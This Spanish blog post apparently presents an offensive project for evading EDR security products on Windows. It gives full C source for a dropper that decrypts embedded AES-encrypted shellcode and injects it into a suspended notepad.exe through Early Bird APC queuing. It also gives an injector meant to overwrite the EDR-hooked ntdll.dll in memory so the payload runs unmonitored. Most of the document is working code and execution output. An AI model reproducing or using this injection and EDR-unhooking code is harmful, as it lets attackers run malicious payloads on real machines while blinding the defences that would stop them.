---
layout: default
---

# Proyecto inyección de DLLs

En el pequeño proyecto que os propongo sobre inyección de DLLs, la idea es trabajar con 3 binarios diferentes:
- Dropper.exe: este bianrio parte de la inyección ya explicada con la técnica [EarlyBird](./Earlybird.html), se encargará de crear un nuevo procesos notpad.exe que se convertirá en nuestro `target`, genial si todo va bien finalmente inyectará un shellcode y resumiará la ejecución del thread en suspensión.
- ProcessHacker/Debugger : este binario se encargará de analizar las DLLs cargadas en un proceso dado, además de obtener las funciones exportadas disponibles y su posición de memoria, será nuestros ojos en este proyecto de cara a evaluar el proceso `target`.
- DllInjector.exe: Se trata de un binario que se utiliza para inyectar DLLs an un proceso `target` con sRDI tal y como se ha visto en la entrada del post [sRDI](./DLL_injection.html).

Como se puede entender, el objetivo final de este proyecto es el de modificar las DLLs manipuladas por los EDRs en tiempo de ejecución que se encuentran cargadas en memoria tal yc omo se ha visto en la entrada del blog [EDRs II](./EDRS_deeper.html)

# Diagrama de flujo

![Project_diagram](/assets/images/project_dll_diagram.png)

Los puntos de ejecución mas interesantes, serán:
- Ejecución del dropper con la creación del proceso objetivo
- Revisión de las DLL y posiciones de memoria
- Inyección de la DLL en el proceso objetivo
- Revisión de las DLL y posiciones de memoria

## Dropper.exe

El código fuente asociado a este binario, va a ser el siguiente:

```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
unsigned char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	return 0;
}


int main(void) {
	int pid = 0;
	DWORD lpid = GetCurrentProcessId();
	printf("[main] Init program %d \n", lpid);
	getchar();
    HANDLE hProc = NULL;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	void * pRemoteCode;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
	CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	printf("[injection] CreateProcessA (Suspended mode)\n\t ParentProcessId: %d \n\t RemoteProcessId (notepad.exe) %d \n\t RemoteThreadId %d \n", lpid, pi.dwProcessId, pi.dwThreadId);
	getchar();
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));	
	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
	getchar();
	printf("[injection] ParentProcessId: %d \n\t RemoteProcessId %d \n\t RemoteThreadId %d \n\t payload = %p \n\t RemoteCOde = %p \n", lpid, pi.dwProcessId, pi.dwThreadId, payload, pRemoteCode);
	ResumeThread(pi.hThread);
	getchar();
	return 0;
}
```
Su ejecución de forma atómica e independiente sin EDR será la siguiente:

```
Dropper.exe
[main] Init program 7828

[injection] CreateProcessA (Suspended mode)
         ParentProcessId: 7828
         RemoteProcessId (notepad.exe) 3560
         RemoteThreadId 3580


[injection] ParentProcessId: 7828
         RemoteProcessId 3560
         RemoteThreadId 3580
         payload = 00007FF76851D000
         RemoteCOde = 000002C1386D0000

```
Ejecutará una calculadora del sistema

¿Que ocurre si tenemos un EDR? `detecta la inyección y nos mata el proceso nunca se ejecutará nuestra calculadora` Un evidencia con BETOM es la siguiente:

![Injection_BETOM](/assets/images/EDR_inject_detection.png)

## DllInjector.exe

El código fuente asociado a este binario, va a ser el siguiente:

La DLL, seleccionada es NTDLL.dll la cual sabemos que es Hookeada por los EDR en memoria de los procesos para actualizar sus acciones!

```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>




// NTDLL.dll shellcode 
unsigned char payload[] = {//quito la DLL encriptada porque el tamaño me revienta el repositorio y por tanto la web  ya he explicado como se hace};
unsigned char key[] = { 0x3e, 0x9, 0xd2, 0xd6, 0x11, 0xe1, 0xa1, 0x3b, 0xe5, 0x44, 0xea, 0x2b, 0x45, 0x2e, 0x17, 0xf };


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
HANDLE FindThread(int pid){
	printf("[FindThread] for pid %d \n", pid);
	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;
	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	while (Thread32Next(Snap, &thEntry)) {
		//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);
		if (thEntry.th32OwnerProcessID == pid) 	{
			printf("[FindThread] ProcessId: %d Thread %d \n", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido     
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				//printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("[FindProcess]: Process Found %s :", pe32.szExeFile);
						printf(" PID %d \n", pid);
                        break;
                }
        }       
        CloseHandle(hProcSnap); //se cierra el snapshot       
        return pid; // retorno de pid
}


int main(void) {
	printf("[main] DllInjector Process Init \n");
	DWORD lpid = GetCurrentProcessId();
	printf("[main] Current Process PID %d \n", lpid);
	getchar();
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("[Main] Target notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		HANDLE hThread = FindThread(pid);
		if (hThread == NULL) {
			printf("Error, hijack unsuccessful.\n");
			return -1;
		}
		getchar();
		void * exec_mem;
		BOOL rv;
		HANDLE th;
		DWORD oldprotect = 0;
		unsigned int payload_len = sizeof(payload);
		exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
		RtlMoveMemory(exec_mem, payload, payload_len);
		rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
		if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
		}
	}
	printf("[main] DllInjector Process End \n");
	return 0;
}

```
La ejecución de este binario solo tiene sentido si tenemos el Dropper.exe ejecutando:

```
Dropper.exe
[main] Init program 6568

[injection] CreateProcessA (Suspended mode)
         ParentProcessId: 6568
         RemoteProcessId (notepad.exe) 3584
         RemoteThreadId 2792
```

El binario inyector:

```
DllInjector.exe
[main] DllInjector Process Init
[main] Current Process PID 2004

[FindProcess]: Process Found notepad.exe : PID 3584
[Main] Target notepad.exe PID = 3584
[FindThread] for pid 3584
[FindThread] ProcessId: 3584 Thread 2792
```



¿Que ocurre si sobreeescribimos la DLL ntdll.dll en memoria del proceso? `Exacto el EDR deja de monitorizar nuestras acciones y por lo tanto el payload se ejecuta`

Conclusión, el mejor ataque parte de entender a tu opnente !!

![EDR Overwrite](/assets/images/NTDLL_overwrite.png)


## Revisión de las DLLs

Tengo el código fuente pero la mejor opción es revisarlo desde un Debugger o ProcessHacker:
![DLLreviewer](/assets/images/DllReviewer.png)
![Debugger](/assets/images/Debugger_Dropper.png)
![ProcessHacker](/assets/images/Process_hacker_ntdll.png)

[Back](./)